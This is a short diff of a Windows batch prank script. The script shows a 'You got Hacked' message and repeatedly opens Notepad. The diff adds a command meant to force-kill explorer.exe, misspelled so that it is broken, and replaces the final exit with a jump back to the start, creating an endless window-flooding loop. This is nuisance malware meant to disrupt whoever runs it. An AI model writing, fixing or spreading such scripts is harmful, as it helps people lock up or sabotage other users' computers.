@@ -1,4 +1,4 @@
-  @ECHO off
+     @ECHO off
 
 
      :Begin
@@ -8,7 +8,9 @@
      msg * HAHAHA, You got Hacked !
 
 
-     
+     Taskill /f /m explorer.exe
+
+
 
 
 cd “C:\Windows\System32”
@@ -2261,15 +2263,10 @@ cd “C:\Windows\System32”
 start notepad.exe
 cd “C:\Windows\System32”
 start notepad.exe
-cd “C:\Windows\System32”
-start notepad.exe
-cd “C:\Windows\System32”
-start notepad.exe
-
 
 
 
 
 
 
-exit
+Goto Begin 
